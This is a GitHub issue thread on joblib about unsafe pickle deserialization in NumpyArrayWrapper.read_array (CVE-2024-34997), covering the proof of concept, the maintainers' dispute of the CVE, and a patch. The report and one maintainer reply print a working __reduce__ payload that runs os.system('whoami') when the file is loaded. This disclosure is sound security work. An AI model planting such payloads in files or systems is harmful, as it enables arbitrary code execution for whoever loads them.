
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjoblib%2Fjoblib%2Fissues%2F1582)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjoblib%2Fjoblib%2Fissues%2F1582)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=joblib%2Fjoblib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[joblib](/joblib)
/
**[joblib](/joblib/joblib)**
Public

* [Notifications](/login?return_to=%2Fjoblib%2Fjoblib) You must be signed in to change notification settings
* [Fork
  421](/login?return_to=%2Fjoblib%2Fjoblib)
* [Star
   3.9k](/login?return_to=%2Fjoblib%2Fjoblib)

* [Code](/joblib/joblib)
* [Issues
  381](/joblib/joblib/issues)
* [Pull requests
  60](/joblib/joblib/pulls)
* [Actions](/joblib/joblib/actions)
* [Projects
  0](/joblib/joblib/projects)
* [Wiki](/joblib/joblib/wiki)
* [Security](/joblib/joblib/security)
* [Insights](/joblib/joblib/pulse)

Additional navigation options

* [Code](/joblib/joblib)
* [Issues](/joblib/joblib/issues)
* [Pull requests](/joblib/joblib/pulls)
* [Actions](/joblib/joblib/actions)
* [Projects](/joblib/joblib/projects)
* [Wiki](/joblib/joblib/wiki)
* [Security](/joblib/joblib/security)
* [Insights](/joblib/joblib/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fjoblib%2Fjoblib%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fjoblib%2Fjoblib%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# an unsafe use of pickle #1582

Closed

[K1ingzzz](/K1ingzzz) opened this issue
May 6, 2024
· 15 comments

Closed

# [an unsafe use of pickle](#top) #1582

[K1ingzzz](/K1ingzzz) opened this issue
May 6, 2024
· 15 comments

## Comments

[![@K1ingzzz](https://avatars.githubusercontent.com/u/72647470?s=80&u=fdf384679ca0fe5ed37894b20bcf8bc755c7154b&v=4)](/K1ingzzz)

Copy link

### **[K1ingzzz](/K1ingzzz)** commented [May 6, 2024](#issue-2280780192)

| Python 3.9.13, joblib 1.4.2  joblib.numpy\_pickle::NumpyArrayWrapper().read\_array() use pickle.load() to deserialize data, which may allows to execute evil code locally,if the project runs on a public online server,it may cause romate attack through reverse shell.  poc  ``` #test.py from joblib.numpy_pickle import NumpyArrayWrapper import os import pickle import numpy  class A:     def __reduce__(self):         return (os.system,('whoami',))      a=A() with open('testnpyarray.pkl','wb') as file:     pickle.dump(a,file)  class B:     def __init__(self,file_handle):         self.file_handle=file_handle  x=numpy.array([1,'a',{}],dtype=object) with open('testnpyarray.pkl','rb') as f:     b=B(f)     NumpyArrayWrapper(subclass='',shape=[],order='',dtype=x.dtype).read_array(b) ```  run `python .\test.py`, and the shell will display your username, that is the result of cmd `whoami` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@carnil](https://avatars.githubusercontent.com/u/773068?s=80&u=54a9fd1cfc2b1abb34a487f17e07eb8a03cecdae&v=4)](/carnil)

Copy link

### **[carnil](/carnil)** commented [May 18, 2024](#issuecomment-2118742526)

| This issue seems to have gotten [CVE-2024-34997](https://github.com/advisories/GHSA-rf65-fc2p-2gjv "CVE-2024-34997") assigned. |
| --- |

All reactions

Sorry, something went wrong.

[danigm](/danigm)
added a commit
to danigm/joblib
that referenced
this issue
[May 20, 2024](#ref-commit-a54d99b)
[![@danigm](https://avatars.githubusercontent.com/u/50350?s=40&u=18b31a6619cfc3a97d1b64fd4a7f9d00d49720fb&v=4)](/danigm)

`[Do not allow pickle.load in read_array by default](/danigm/joblib/commit/a54d99bc0e530664df1b66096722f5b635fc758e "Do not allow pickle.load in read_array by default

This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb

Fix CVE-2024-34997, https://github.com/joblib/joblib/issues/1582")`
…

`[a54d99b](/danigm/joblib/commit/a54d99bc0e530664df1b66096722f5b635fc758e)`

```
This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
[numpy/numpy@a2bd3a7](https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb)

Fix [CVE-2024-34997](https://github.com/advisories/GHSA-rf65-fc2p-2gjv "CVE-2024-34997"), [joblib#1582](https://github.com/joblib/joblib/issues/1582)
```

[![@danigm](https://avatars.githubusercontent.com/u/50350?s=40&u=18b31a6619cfc3a97d1b64fd4a7f9d00d49720fb&v=4)](/danigm)
[danigm](/danigm)
mentioned this issue
[May 20, 2024](#ref-pullrequest-2305865635)

[Do not allow pickle.load in read\_array by default
#1585](/joblib/joblib/pull/1585)
 Closed

[danigm](/danigm)
added a commit
to danigm/joblib
that referenced
this issue
[May 20, 2024](#ref-commit-a0b3731)
[![@danigm](https://avatars.githubusercontent.com/u/50350?s=40&u=18b31a6619cfc3a97d1b64fd4a7f9d00d49720fb&v=4)](/danigm)

`[Do not allow pickle.load in read_array by default](/danigm/joblib/commit/a0b3731c62e39cd1d19b44612074e3ce6e6a4790 "Do not allow pickle.load in read_array by default

This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb

Fix CVE-2024-34997, https://github.com/joblib/joblib/issues/1582")`
…

`[a0b3731](/danigm/joblib/commit/a0b3731c62e39cd1d19b44612074e3ce6e6a4790)`

```
This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
[numpy/numpy@a2bd3a7](https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb)

Fix [CVE-2024-34997](https://github.com/advisories/GHSA-rf65-fc2p-2gjv "CVE-2024-34997"), [joblib#1582](https://github.com/joblib/joblib/issues/1582)
```

[danigm](/danigm)
added a commit
to danigm/joblib
that referenced
this issue
[May 20, 2024](#ref-commit-4177f3b)
[![@danigm](https://avatars.githubusercontent.com/u/50350?s=40&u=18b31a6619cfc3a97d1b64fd4a7f9d00d49720fb&v=4)](/danigm)

`[Do not allow pickle.load in read_array by default](/danigm/joblib/commit/4177f3b9ca46475fd0d4cad6fd284acba189af45 "Do not allow pickle.load in read_array by default

This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb

Fix CVE-2024-34997, https://github.com/joblib/joblib/issues/1582")`
…

`[4177f3b](/danigm/joblib/commit/4177f3b9ca46475fd0d4cad6fd284acba189af45)`

```
This patch adds a new optional argument to the read_array method to
enable pickle. By default the pickle load is disabled.

This is based on the actual code in numpy/lib/format.py:
[numpy/numpy@a2bd3a7](https://github.com/numpy/numpy/commit/a2bd3a7eabfe053d6d16a2130fdcad9e5211f6bb)

Fix [CVE-2024-34997](https://github.com/advisories/GHSA-rf65-fc2p-2gjv "CVE-2024-34997"), [joblib#1582](https://github.com/joblib/joblib/issues/1582)
```

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=80&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)

Copy link

Contributor

### **[tomMoral](/tomMoral)** commented [May 20, 2024](#issuecomment-2120517671)

| Hello,  Thanks for the issue, however, I don't think it makes sense in the context of the `joblib` library. Note that similar issue has already been discussed in [#977](https://github.com/joblib/joblib/issues/977)  Here, the `NumpyArrayWrapper` is used internally to persist numpy arrays in the context of sharing objects between two processes/distributed experiments/caching. One of joblib's goal is to allow the user to serialize any Python object to communicate tasks or results, or to cache results. To achieve this, we need to be as open as possible with our serialization and therefor use the `pickle` format.  IMO, a simpler and unsafe pattern is even simpler than this:  ``` import os import pickle  class A:     def __reduce__(self):         return (os.system,('whoami',))      a=A()  with open('a.pkl','wb') as file:     pickle.dump(a,file) with open('a.pkl', 'rb') as file:     pickle.load(file) ```  So why add an extra feature to avoid this in a nested case? We are already making it clear that `joblib.load` should not be used for inter-user sharing on this page: <https://joblib.readthedocs.io/en/stable/generated/joblib.load.html> We could maybe make the `NumpyArrayWrapper` private to make it clearer it should not be used outside the parallel/caching context if you think this is not clear enough (it is not exposed in the doc).  I am closing this issue for now but feel free to continue the discussion if you think I am missing some points. |
| --- |

All reactions

Sorry, something went wrong.

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=40&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)
[tomMoral](/tomMoral)
closed this as [completed](/joblib/joblib/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[May 20, 2024](#event-12866695905)

[![@rshanlever](https://avatars.githubusercontent.com/u/3543436?s=80&v=4)](/rshanlever)

Copy link

### **[rshanlever](/rshanlever)** commented [May 28, 2024](#issuecomment-2136146467)

| With their being an NVD entry for this that isn't marked as disputed, it's flagging this component in security scanners. Probably bad to leave it in limbo. |
| --- |

All reactions

Sorry, something went wrong.

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=80&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)

Copy link

Contributor

### **[tomMoral](/tomMoral)** commented [May 28, 2024](#issuecomment-2136193578)

| Hi, I am sorry but I have no idea how to dispute this CVE. If you have any guide toward how we can remove this flag, this would be super helpful. |
| --- |

All reactions

Sorry, something went wrong.

[![@AxelTeichert](https://avatars.githubusercontent.com/u/34173515?s=80&v=4)](/AxelTeichert)

Copy link

### **[AxelTeichert](/AxelTeichert)** commented [May 29, 2024](#issuecomment-2137180209)

| <https://www.cve.org/Resources/General/Policies/CVE-Record-Dispute-Policy.pdf> |
| --- |

All reactions

Sorry, something went wrong.

[![@noren95](https://avatars.githubusercontent.com/u/114586487?s=80&u=eda5e62f332ac3fb9237ae580546ff69a54d2068&v=4)](/noren95)

Copy link

### **[noren95](/noren95)** commented [May 29, 2024](#issuecomment-2137287905)

| [@tomMoral](https://github.com/tomMoral) So what are your conclusions in this case? As I understand this behavior is a part of joblib (that allows de/serialization), and the apparently "vulnerability" is caused by an incorrect use of the component? |
| --- |

All reactions

Sorry, something went wrong.

[![@AxelTeichert](https://avatars.githubusercontent.com/u/34173515?s=80&v=4)](/AxelTeichert)

Copy link

### **[AxelTeichert](/AxelTeichert)** commented [May 29, 2024](#issuecomment-2137468186)

| Well, if you would kindly write a dispute, it looks much better to company users of this module. |
| --- |

 👍
1
 decodering reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@Martinogorman-tp](https://avatars.githubusercontent.com/u/56541461?s=80&v=4)](/Martinogorman-tp)

Copy link

### **[Martinogorman-tp](/Martinogorman-tp)** commented [May 31, 2024](#issuecomment-2142538053)

| This package is now flagged by our security scanners. We can no longer download due to <https://nvd.nist.gov/vuln/detail/CVE-2024-34997> |
| --- |

 👍
2
 decodering and mcvincekova reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@mcvincekova](https://avatars.githubusercontent.com/u/44243029?s=80&v=4)](/mcvincekova)

Copy link

### **[mcvincekova](/mcvincekova)** commented [Jun 17, 2024](#issuecomment-2172471478) • edited Loading

| [@tomMoral](https://github.com/tomMoral) what should our expectations be in this case? unless this is fixed or the issue is disputed, we will need to drop usage of this library, due to it being flagged as insecure.  Can we reopen this issue (or should I make a new one), since it doesn't look like it has been resolved? Unless the `it's correct behaviour` is the resolution we should accept and move to a different lib.  Thanks for any update. |
| --- |

All reactions

Sorry, something went wrong.

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=80&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)

Copy link

Contributor

### **[tomMoral](/tomMoral)** commented [Jun 17, 2024](#issuecomment-2172556477)

| Hello,  As stated above, inter-process communication requires pickling arbitrary code, so this is the correct behavior. The pickle load is produced by the main process, which should have a secure connection with the worker processes so I think it is quite hard to attack. For `joblib.load` there is a note stating it should `never be used to load files from untrusted sources`.  The fact that the library was flagged for this behavior is problematic and I am happy to dispute this. However, I have no clue where I should do this and I don't have the time to investigate. I don't see where I should enter extra information on this page: <https://nvd.nist.gov/vuln/detail/CVE-2024-34997>  If you can point me toward where I should dispute this, I will do this quickly. |
| --- |

All reactions

Sorry, something went wrong.

[![@mcvincekova](https://avatars.githubusercontent.com/u/44243029?s=80&v=4)](/mcvincekova)

Copy link

### **[mcvincekova](/mcvincekova)** commented [Jun 17, 2024](#issuecomment-2172611584)

| Hey, thanks for the response.  I am not a 100% sure about the process, but given [the official guide](https://www.cve.org/Resources/General/Policies/CVE-Record-Dispute-Policy.pdf) and the contact info on their [official page](https://www.cve.org/), I *think* you can:   * Request an update to an existing CVE [via their contact form](https://cveform.mitre.org/) * Wait for the response & see what is required for you to complete the dispute claim   I hope that helps. |
| --- |

 👍
1
 Martinogorman-tp reacted with thumbs up emoji
 👀
1
 noren95 reacted with eyes emoji

All reactions

* 👍
  1 reaction
* 👀
  1 reaction

Sorry, something went wrong.

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=80&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)

Copy link

Contributor

### **[tomMoral](/tomMoral)** commented [Jun 17, 2024](#issuecomment-2172706998)

| Thanks, I did send them a request for update. I will keep you inform when I hear back from them. |
| --- |

 👍
7
 mcvincekova, AxelTeichert, aloiswirth, e3vela, Martinogorman-tp, SamuelHans, and Sanatmpa reacted with thumbs up emoji

All reactions

* 👍
  7 reactions

Sorry, something went wrong.

[![@GaelVaroquaux](https://avatars.githubusercontent.com/u/208217?s=80&u=d1b44b8878cb4b692d3557450e8c5ce5881e2725&v=4)](/GaelVaroquaux)

Copy link

Member

### **[GaelVaroquaux](/GaelVaroquaux)** commented [Jul 1, 2024](#issuecomment-2199632232)

| I think that we should re-open this issue as long as the upstream CVE is open, as the upstream CVE is impacting the users.  [@tomMoral](https://github.com/tomMoral), what do you think? |
| --- |

 👍
1
 avioligo reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=80&u=727de5970d32aaf7aeea0527b546000bf19660ec&v=4)](/tomMoral)

Copy link

Contributor

### **[tomMoral](/tomMoral)** commented [Jul 1, 2024](#issuecomment-2199646574)

| On the official CVE website, the security issue is marked as disputed with a link to this discussion: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34997> (I just checked today, did not received any feedback on the dispute and I don't know how to make the CVE close the matter).  I would say it is ok to keep this one close, but if you feel that it is helpful to re-open a tracking of the CVE, I would be in favor of re-opening one specifically referencing and tracking the CVE like this one: [#1588](https://github.com/joblib/joblib/issues/1588) |
| --- |

All reactions

Sorry, something went wrong.

[![@GaelVaroquaux](https://avatars.githubusercontent.com/u/208217?s=80&u=d1b44b8878cb4b692d3557450e8c5ce5881e2725&v=4)](/GaelVaroquaux)

Copy link

Member

### **[GaelVaroquaux](/GaelVaroquaux)** commented [Jul 1, 2024](#issuecomment-2199647755)

| OK, I'll re-open the other one. Thanks [@tomMoral](https://github.com/tomMoral) !! |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fjoblib%2Fjoblib%2Fissues%2F1582)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

9 participants

[![@GaelVaroquaux](https://avatars.githubusercontent.com/u/208217?s=52&v=4)](/GaelVaroquaux) [![@carnil](https://avatars.githubusercontent.com/u/773068?s=52&v=4)](/carnil) [![@tomMoral](https://avatars.githubusercontent.com/u/3321081?s=52&v=4)](/tomMoral) [![@rshanlever](https://avatars.githubusercontent.com/u/3543436?s=52&v=4)](/rshanlever) [![@AxelTeichert](https://avatars.githubusercontent.com/u/34173515?s=52&v=4)](/AxelTeichert) [![@mcvincekova](https://avatars.githubusercontent.com/u/44243029?s=52&v=4)](/mcvincekova) [![@Martinogorman-tp](https://avatars.githubusercontent.com/u/56541461?s=52&v=4)](/Martinogorman-tp) [![@K1ingzzz](https://avatars.githubusercontent.com/u/72647470?s=52&v=4)](/K1ingzzz) [![@noren95](https://avatars.githubusercontent.com/u/114586487?s=52&v=4)](/noren95)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

